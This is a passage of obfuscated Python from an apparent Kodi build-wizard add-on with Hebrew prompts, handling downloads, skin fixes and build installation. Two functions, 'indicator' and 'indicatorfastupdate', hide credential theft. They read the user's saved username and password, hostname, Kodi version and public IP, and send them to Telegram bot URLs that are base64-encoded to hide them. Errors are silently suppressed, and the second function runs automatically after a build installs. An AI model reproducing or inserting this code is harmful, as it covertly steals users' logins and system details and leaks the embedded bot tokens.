                    O00OOOO0O00O0O0OO =int (O0OOO000OOO00OOOO *OOOO0OO0000O00O00 *100 /O0000000O0OO00O00 )#line:3387
                    if OOO0O00O00O0O0OO0 >1024 and not O00OOOO0O00O0O0OO ==100 :#line:3388
                      OOOO00O000OO000OO =int (((O0000000O0OO00O00 -OO000O000OOO0OO0O )/1024 )/(OOO0O00O00O0O0OO0 ))#line:3389
                    else :#line:3390
                      OOOO00O000OO000OO =0 #line:3391
                    O0O00OOOO0O0O000O .update (int (O00OOOO0O00O0O0OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00OOOO0O00O0O0OO ,OO000O000OOO0OO0O /(1024 *1024 ),O0000000O0OO00O00 /(1000 *1000 ),OOO0O00O00O0O0OO0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOO00O000OO000OO ,60 ))#line:3393
                    O0OOO000OOO00OOOO +=1 #line:3394
                    if O0O00OOOO0O0O000O .iscanceled ():#line:3395
                     O0O00OOOO0O0O000O .close ()#line:3396
                     break #line:3397
    OOOOOO0OO0O00O0OO ="https://docs.google.com/uc?export=download"#line:3398
    import urllib2 #line:3403
    import cookielib #line:3404
    from cookielib import CookieJar #line:3406
    OOO0OOOOOOO00OOO0 =CookieJar ()#line:3408
    O00000O00O0OOOOO0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OOO0OOOOOOO00OOO0 ))#line:3409
    O0O0O0OO000O0000O ={'id':OO0OOO00OOO0O000O }#line:3411
    O00O000O00O00O00O =urllib .urlencode (O0O0O0OO000O0000O )#line:3412
    logging .warning (OOOOOO0OO0O00O0OO +'&'+O00O000O00O00O00O )#line:3413
    OOOOOO00OOO0OOOOO =O00000O00O0OOOOO0 .open (OOOOOO0OO0O00O0OO +'&'+O00O000O00O00O00O )#line:3414
    O0000000O0O0O00O0 =OOOOOO00OOO0OOOOO .read ()#line:3415
    for O0O0000OO0O0OOO00 in OOO0OOOOOOO00OOO0 :#line:3417
         logging .warning (O0O0000OO0O0OOO00 )#line:3418
    O0OOOOO000OOOOOO0 =O00OOOO00O0O00O00 (OOO0OOOOOOO00OOO0 )#line:3419
    logging .warning (O0OOOOO000OOOOOO0 )#line:3420
    if O0OOOOO000OOOOOO0 :#line:3421
        OOOOO0O0OOOOO0000 ={'id':OO0OOO00OOO0O000O ,'confirm':O0OOOOO000OOOOOO0 }#line:3422
        O0OO0O0O00000OOOO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3423
        O00O000O00O00O00O =urllib .urlencode (OOOOO0O0OOOOO0000 )#line:3424
        OOOOOO00OOO0OOOOO =O00000O00O0OOOOO0 .open (OOOOOO0OO0O00O0OO +'&'+O00O000O00O00O00O )#line:3425
        chunk_read (OOOOOO00OOO0OOOOO ,report_hook =chunk_report ,dp =O0O00OOOO0O0O000O ,destination =O0OOOO0OO0O0OO0O0 ,filesize =OO00O0O0O0O0O00OO )#line:3426
    return (O000OO00OO0000O00 )#line:3430
def kodi17Fix ():#line:3431
	O000O00OOOOO0OO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3432
	OOO0000OO0O0OOO00 =[]#line:3433
	for O0O0OOO0O0OOOO0OO in sorted (O000O00OOOOO0OO00 ,key =lambda OOO00OOOOO00O0O00 :OOO00OOOOO00O0O00 ):#line:3434
		O0O0000O0OOOO0OOO =os .path .join (O0O0OOO0O0OOOO0OO ,'addon.xml')#line:3435
		if os .path .exists (O0O0000O0OOOO0OOO ):#line:3436
			OO00000O0O0O00O00 =O0O0OOO0O0OOOO0OO .replace (ADDONS ,'')[1 :-1 ]#line:3437
			OOO0OOO0OO000OO0O =open (O0O0000O0OOOO0OOO )#line:3438
			O000000OO0OOOO000 =OOO0OOO0OO000OO0O .read ()#line:3439
			O00OO00OOO0000000 =parseDOM (O000000OO0OOOO000 ,'addon',ret ='id')#line:3440
			OOO0OOO0OO000OO0O .close ()#line:3441
			try :#line:3442
				O0OOOO00OOOOOOOOO =xbmcaddon .Addon (id =O00OO00OOO0000000 [0 ])#line:3443
			except :#line:3444
				try :#line:3445
					log ("%s was disabled"%O00OO00OOO0000000 [0 ],xbmc .LOGDEBUG )#line:3446
					OOO0000OO0O0OOO00 .append (O00OO00OOO0000000 [0 ])#line:3447
				except :#line:3448
					try :#line:3449
						log ("%s was disabled"%OO00000O0O0O00O00 ,xbmc .LOGDEBUG )#line:3450
						OOO0000OO0O0OOO00 .append (OO00000O0O0O00O00 )#line:3451
					except :#line:3452
						if len (O00OO00OOO0000000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO00000O0O0O00O00 ,xbmc .LOGERROR )#line:3453
						else :log ("Unabled to enable: %s"%O0O0OOO0O0OOOO0OO ,xbmc .LOGERROR )#line:3454
	if len (OOO0000OO0O0OOO00 )>0 :#line:3455
		OO0000OOOO0O00O0O =0 #line:3456
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3457
		for OOOO00O0OO0OO0O0O in OOO0000OO0O0OOO00 :#line:3458
			OO0000OOOO0O00O0O +=1 #line:3459
			O000O0O000OOOO0OO =int (percentage (OO0000OOOO0O00O0O ,len (OOO0000OO0O0OOO00 )))#line:3460
			DP .update (O000O0O000OOOO0OO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00O0OO0OO0O0O ))#line:3461
			addonDatabase (OOOO00O0OO0OO0O0O ,1 )#line:3462
			if DP .iscanceled ():break #line:3463
		if DP .iscanceled ():#line:3464
			DP .close ()#line:3465
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3466
			sys .exit ()#line:3467
		DP .close ()#line:3468
	forceUpdate ()#line:3469
def indicator ():#line:3471
       try :#line:3472
          import json #line:3473
          wiz .log ('FRESH MESSAGE')#line:3474
          O0O00O00OOOOO0OOO =(ADDON .getSetting ("user"))#line:3475
          O00O0000OOOOO0OO0 =(ADDON .getSetting ("pass"))#line:3476
          O0OO00OOO0O0O0O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3477
          O00OO0OO0OO00O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3478
          O0O000O0O0OO0OOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3479
          O0OO0O000O0OOOOO0 =str (json .loads (O0O000O0O0OO0OOO0 )['ip'])#line:3480
          OOOOOOOOOOO0O0O0O =O0O00O00OOOOO0OOO #line:3481
          OOOOO000O0OO0OO00 =O00O0000OOOOO0OO0 #line:3482
          import socket #line:3483
          O0O000O0O0OO0OOO0 =urllib2 .urlopen (O00OO0OO0OO00O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOOOOOOOO0O0O0O +' - '+OOOOO000O0OO0OO00 +' - '+O0OO00OOO0O0O0O0O +' - '+O0OO0O000O0OOOOO0 ).readlines ()#line:3484
       except :pass #line:3486
def indicatorfastupdate ():#line:3488
       try :#line:3489
          import json #line:3490
          wiz .log ('FRESH MESSAGE')#line:3491
          O000OO0O0O0OOO00O =(ADDON .getSetting ("user"))#line:3492
          O0O0O00OOO0000000 =(ADDON .getSetting ("pass"))#line:3493
          O0000OOO0O000O000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3494
          OOOO000O0000OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3496
          OO0OOOO0000OOO00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3497
          O0OOOOOOOOO0OOO0O =str (json .loads (OO0OOOO0000OOO00O )['ip'])#line:3498
          O0O0OO000000O0000 =O000OO0O0O0OOO00O #line:3499
          O0O0O000O0000O0OO =O0O0O00OOO0000000 #line:3500
          import socket #line:3502
          OO0OOOO0000OOO00O =urllib2 .urlopen (OOOO000O0000OO000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0OO000000O0000 +' - '+O0O0O000O0000O0OO +' - '+O0000OOO0O000O000 +' - '+O0OOOOOOOOO0OOO0O ).readlines ()#line:3503
       except :pass #line:3505
def skinfix18 ():#line:3507
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3508
		OOOOO000O00O00OOO =wiz .workingURL (SKINID18DDONXML )#line:3509
		if OOOOO000O00O00OOO ==True :#line:3510
			OO00O0O000OOO0OO0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3511
			if len (OO00O0O000OOO0OO0 )>0 :#line:3512
				O0OO000OOO00O00OO ='%s-%s.zip'%(SKINID18 ,OO00O0O000OOO0OO0 [0 ])#line:3513
				O0O0OO00O00000000 =wiz .workingURL (SKIN18ZIPURL +O0OO000OOO00O00OO )#line:3514
				if O0O0OO00O00000000 ==True :#line:3515
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3516
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3517
					OOOO0OO00OOO00OOO =os .path .join (PACKAGES ,O0OO000OOO00O00OO )#line:3518
					try :os .remove (OOOO0OO00OOO00OOO )#line:3519
					except :pass #line:3520
					downloader .download (SKIN18ZIPURL +O0OO000OOO00O00OO ,OOOO0OO00OOO00OOO ,DP )#line:3521
					extract .all (OOOO0OO00OOO00OOO ,HOME ,DP )#line:3522
					try :#line:3523
						OOO00OOOO000OO0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3524
						O0O0OO0OOO0OO0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3525
						os .rename (OOO00OOOO000OO0O0 ,O0O0OO0OOO0OO0000 )#line:3526
					except :#line:3527
						pass #line:3528
					try :#line:3529
						O000OOOO0OO0OO0OO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO00000O000OO0O0O =O000OOOO0OO0OO0OO .read ();O000OOOO0OO0OO0OO .close ()#line:3530
						O000OO0O0O0OOO000 =wiz .parseDOM (OO00000O000OO0O0O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3531
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OO0O0O0OOO000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3532
					except :#line:3533
						pass #line:3534
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3535
					DP .close ()#line:3536
					xbmc .sleep (500 )#line:3537
					wiz .forceUpdate (True )#line:3538
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3539
				else :#line:3540
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3541
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0OO00O00000000 ,xbmc .LOGERROR )#line:3542
			else :#line:3543
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3544
		else :#line:3545
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3546
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3547
def skinfix17 ():#line:3548
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3549
		OO0OOO00OOOO00O00 =wiz .workingURL (SKINID17DDONXML )#line:3550
		if OO0OOO00OOOO00O00 ==True :#line:3551
			O0OO00O0OO00O00OO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3552
			if len (O0OO00O0OO00O00OO )>0 :#line:3553
				OOOOOOO0O0O0OO0O0 ='%s-%s.zip'%(SKINID17 ,O0OO00O0OO00O00OO [0 ])#line:3554
				O0O0OO0O000OOO0OO =wiz .workingURL (SKIN17ZIPURL +OOOOOOO0O0O0OO0O0 )#line:3555
				if O0O0OO0O000OOO0OO ==True :#line:3556
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3557
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3558
					O00OOO0O0O00O0O0O =os .path .join (PACKAGES ,OOOOOOO0O0O0OO0O0 )#line:3559
					try :os .remove (O00OOO0O0O00O0O0O )#line:3560
					except :pass #line:3561
					downloader .download (SKIN17ZIPURL +OOOOOOO0O0O0OO0O0 ,O00OOO0O0O00O0O0O ,DP )#line:3562
					extract .all (O00OOO0O0O00O0O0O ,HOME ,DP )#line:3563
					try :#line:3564
						OOOO00OO0O0OOO0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3565
						O000OOO0OO0O00O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3566
						os .rename (OOOO00OO0O0OOO0OO ,O000OOO0OO0O00O00 )#line:3567
					except :#line:3568
						pass #line:3569
					try :#line:3570
						OOOOOO0OO0OOOOOO0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOO0O000O0OO000OO =OOOOOO0OO0OOOOOO0 .read ();OOOOOO0OO0OOOOOO0 .close ()#line:3571
						O00OOO00OO000OOO0 =wiz .parseDOM (OOO0O000O0OO000OO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3572
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOO00OO000OOO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3573
					except :#line:3574
						pass #line:3575
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3576
					DP .close ()#line:3577
					xbmc .sleep (500 )#line:3578
					wiz .forceUpdate (True )#line:3579
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3580
				else :#line:3581
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3582
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0OO0O000OOO0OO ,xbmc .LOGERROR )#line:3583
			else :#line:3584
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3585
		else :#line:3586
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3587
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3588
def fix17update ():#line:3589
	if KODIV >=17 and KODIV <18 :#line:3590
		wiz .kodi17Fix ()#line:3591
		xbmc .sleep (4000 )#line:3592
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3593
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3594
		fixfont ()#line:3595
		O0OOOOO00O0000OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3596
		try :#line:3598
			OO0OO00O0O00O0O0O =open (O0OOOOO00O0000OOO ,'r')#line:3599
			OO0OO0O0O0OOO000O =OO0OO00O0O00O0O0O .read ()#line:3600
			OO0OO00O0O00O0O0O .close ()#line:3601
			O0OO0OO000O0OOO00 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3602
			O0O0000O0O0O00OO0 =re .compile (O0OO0OO000O0OOO00 ).findall (OO0OO0O0O0OOO000O )[0 ]#line:3603
			OO0OO00O0O00O0O0O =open (O0OOOOO00O0000OOO ,'w')#line:3604
			OO0OO00O0O00O0O0O .write (OO0OO0O0O0OOO000O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0O0000O0O0O00OO0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3605
			OO0OO00O0O00O0O0O .close ()#line:3606
		except :#line:3607
				pass #line:3608
		wiz .kodi17Fix ()#line:3609
		O0OOOOO00O0000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3610
		try :#line:3611
			OO0OO00O0O00O0O0O =open (O0OOOOO00O0000OOO ,'r')#line:3612
			OO0OO0O0O0OOO000O =OO0OO00O0O00O0O0O .read ()#line:3613
			OO0OO00O0O00O0O0O .close ()#line:3614
			O0OO0OO000O0OOO00 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3615
			O0O0000O0O0O00OO0 =re .compile (O0OO0OO000O0OOO00 ).findall (OO0OO0O0O0OOO000O )[0 ]#line:3616
			OO0OO00O0O00O0O0O =open (O0OOOOO00O0000OOO ,'w')#line:3617
			OO0OO00O0O00O0O0O .write (OO0OO0O0O0OOO000O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0O0000O0O0O00OO0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3618
			OO0OO00O0O00O0O0O .close ()#line:3619
		except :#line:3620
				pass #line:3621
		swapSkins ('skin.Premium.mod')#line:3622
def fix18update ():#line:3624
	if KODIV >=18 :#line:3625
		xbmc .sleep (4000 )#line:3626
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3627
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3628
		fixfont ()#line:3629
		O0O0O0OO00O0OO000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3630
		try :#line:3631
			OOO0O0O00O0O00O0O =open (O0O0O0OO00O0OO000 ,'r')#line:3632
			O00OOOOOOOO000OO0 =OOO0O0O00O0O00O0O .read ()#line:3633
			OOO0O0O00O0O00O0O .close ()#line:3634
			O0OOO0OOOOOO000O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3635
			OO0O0OOO00OOO000O =re .compile (O0OOO0OOOOOO000O0 ).findall (O00OOOOOOOO000OO0 )[0 ]#line:3636
			OOO0O0O00O0O00O0O =open (O0O0O0OO00O0OO000 ,'w')#line:3637
			OOO0O0O00O0O00O0O .write (O00OOOOOOOO000OO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO0O0OOO00OOO000O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3638
			OOO0O0O00O0O00O0O .close ()#line:3639
		except :#line:3640
				pass #line:3641
		wiz .kodi17Fix ()#line:3642
		O0O0O0OO00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3643
		try :#line:3644
			OOO0O0O00O0O00O0O =open (O0O0O0OO00O0OO000 ,'r')#line:3645
			O00OOOOOOOO000OO0 =OOO0O0O00O0O00O0O .read ()#line:3646
			OOO0O0O00O0O00O0O .close ()#line:3647
			O0OOO0OOOOOO000O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3648
			OO0O0OOO00OOO000O =re .compile (O0OOO0OOOOOO000O0 ).findall (O00OOOOOOOO000OO0 )[0 ]#line:3649
			OOO0O0O00O0O00O0O =open (O0O0O0OO00O0OO000 ,'w')#line:3650
			OOO0O0O00O0O00O0O .write (O00OOOOOOOO000OO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO0O0OOO00OOO000O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3651
			OOO0O0O00O0O00O0O .close ()#line:3652
		except :#line:3653
				pass #line:3654
		swapSkins ('skin.Premium.mod')#line:3655
def buildWizard (OOO000O00O00000O0 ,OOOO0OOOO0O0O00OO ,theme =None ,over =False ):#line:3658
	if over ==False :#line:3659
		O0O00OO00O00O0OOO =wiz .checkBuild (OOO000O00O00000O0 ,'url')#line:3660
		if O0O00OO00O00O0OOO ==False :#line:3662
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3667
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3668
			return #line:3669
		OO0OO00O0O0OO0O00 =wiz .workingURL (O0O00OO00O00O0OOO )#line:3670
		if OO0OO00O0O0OO0O00 ==False :#line:3671
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO0OO00O0O0OO0O00 ))#line:3672
			return #line:3673
	if OOOO0OOOO0O0O00OO =='gui':#line:3674
		if OOO000O00O00000O0 ==BUILDNAME :#line:3675
			if over ==True :O000OO0OO00000OOO =1 #line:3676
			else :O000OO0OO00000OOO =1 #line:3677
		else :#line:3678
			O000OO0OO00000OOO =1 #line:3679
		if O000OO0OO00000OOO :#line:3680
			remove_addons ()#line:3681
			remove_addons2 ()#line:3682
			OO000OOO0O000O00O =wiz .checkBuild (OOO000O00O00000O0 ,'gui')#line:3683
			OOOOOOOOO0OO00O0O =OOO000O00O00000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3684
			if not wiz .workingURL (OO000OOO0O000O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3685
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3686
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O00O00000O0 ),'','אנא המתן')#line:3687
			O0O0OOO000OO0OO00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOOOO0OO00O0O )#line:3688
			try :os .remove (O0O0OOO000OO0OO00 )#line:3689
			except :pass #line:3690
			logging .warning (OO000OOO0O000O00O )#line:3691
			if 'google'in OO000OOO0O000O00O :#line:3692
			   O0OOOOO0000000000 =googledrive_download (OO000OOO0O000O00O ,O0O0OOO000OO0OO00 ,DP ,wiz .checkBuild (OOO000O00O00000O0 ,'filesize'))#line:3693
			else :#line:3696
			  downloader .download (OO000OOO0O000O00O ,O0O0OOO000OO0OO00 ,DP )#line:3697
			xbmc .sleep (100 )#line:3698
			OOOO0OOOOO0OO0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O00O00000O0 )#line:3699
			DP .update (0 ,OOOO0OOOOO0OO0OO0 ,'','אנא המתן')#line:3700
			extract .all (O0O0OOO000OO0OO00 ,HOME ,DP ,title =OOOO0OOOOO0OO0OO0 )#line:3701
			DP .close ()#line:3702
			wiz .defaultSkin ()#line:3703
			wiz .lookandFeelData ('save')#line:3704
			wiz .kodi17Fix ()#line:3705
			if KODIV >=18 :#line:3706
				skindialogsettind18 ()#line:3707
			xbmc .executebuiltin ("ReloadSkin()")#line:3708
			if INSTALLMETHOD ==1 :O0O00O0OOO000O0O0 =1 #line:3709
			elif INSTALLMETHOD ==2 :O0O00O0OOO000O0O0 =0 #line:3710
			else :DP .close ()#line:3711
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3712
			indicatorfastupdate ()#line:3713
		else :#line:3715
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3716
	if OOOO0OOOO0O0O00OO =='gui2':#line:3717
		if OOO000O00O00000O0 ==BUILDNAME :#line:3718
			if over ==True :O000OO0OO00000OOO =1 #line:3719
			else :O000OO0OO00000OOO =1 #line:3720
		else :#line:3721
			O000OO0OO00000OOO =1 #line:3722
		if O000OO0OO00000OOO :#line:3723
			remove_addons ()#line:3724
			remove_addons2 ()#line:3725
			OO000OOO0O000O00O =wiz .checkBuild (OOO000O00O00000O0 ,'gui')#line:3726
			OOOOOOOOO0OO00O0O =OOO000O00O00000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3727
			if not wiz .workingURL (OO000OOO0O000O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3728
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3729
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O00O00000O0 ),'','אנא המתן')#line:3730
			O0O0OOO000OO0OO00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOOOO0OO00O0O )#line:3731
			try :os .remove (O0O0OOO000OO0OO00 )#line:3732
			except :pass #line:3733
			logging .warning (OO000OOO0O000O00O )#line:3734
			if 'google'in OO000OOO0O000O00O :#line:3735
			   O0OOOOO0000000000 =googledrive_download (OO000OOO0O000O00O ,O0O0OOO000OO0OO00 ,DP ,wiz .checkBuild (OOO000O00O00000O0 ,'filesize'))#line:3736
			else :#line:3739
			  downloader .download (OO000OOO0O000O00O ,O0O0OOO000OO0OO00 ,DP )#line:3740
			xbmc .sleep (100 )#line:3741
			OOOO0OOOOO0OO0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O00O00000O0 )#line:3742
			DP .update (0 ,OOOO0OOOOO0OO0OO0 ,'','אנא המתן')#line:3743
			extract .all (O0O0OOO000OO0OO00 ,HOME ,DP ,title =OOOO0OOOOO0OO0OO0 )#line:3744
			DP .close ()#line:3745
			wiz .defaultSkin ()#line:3746
			wiz .lookandFeelData ('save')#line:3747
			if INSTALLMETHOD ==1 :O0O00O0OOO000O0O0 =1 #line:3750
			elif INSTALLMETHOD ==2 :O0O00O0OOO000O0O0 =0 #line:3751
			else :DP .close ()#line:3752
		else :#line:3754
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3755
	elif OOOO0OOOO0O0O00OO =='fresh':#line:3756
		freshStart (OOO000O00O00000O0 )#line:3757
	elif OOOO0OOOO0O0O00OO =='normal':#line:3758
		if url =='normal':#line:3759
			if KEEPTRAKT =='true':#line:3760
				traktit .autoUpdate ('all')#line:3761
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3762
			if KEEPREAL =='true':#line:3763
				debridit .autoUpdate ('all')#line:3764
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3765
			if KEEPLOGIN =='true':#line:3766
				loginit .autoUpdate ('all')#line:3767
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3768
		O00OO0OO0O00OOO00 =int (KODIV );OO0OO0O0OOO0000O0 =int (float (wiz .checkBuild (OOO000O00O00000O0 ,'kodi')))#line:3769
		if not O00OO0OO0O00OOO00 ==OO0OO0O0OOO0000O0 :#line:3770
			if O00OO0OO0O00OOO00 ==16 and OO0OO0O0OOO0000O0 <=15 :OOO0O000OO0OOO0O0 =False #line:3771
			else :OOO0O000OO0OOO0O0 =True #line:3772
		else :OOO0O000OO0OOO0O0 =False #line:3773
		if OOO0O000OO0OOO0O0 ==True :#line:3774
			OO0O0O0O0O0O00OOO =1 #line:3775
		else :#line:3776
			if not over ==False :OO0O0O0O0O0O00OOO =1 #line:3777
			else :OO0O0O0O0O0O00OOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3778
		if OO0O0O0O0O0O00OOO :#line:3779
			wiz .clearS ('build')#line:3780
			OO000OOO0O000O00O =wiz .checkBuild (OOO000O00O00000O0 ,'url')#line:3781
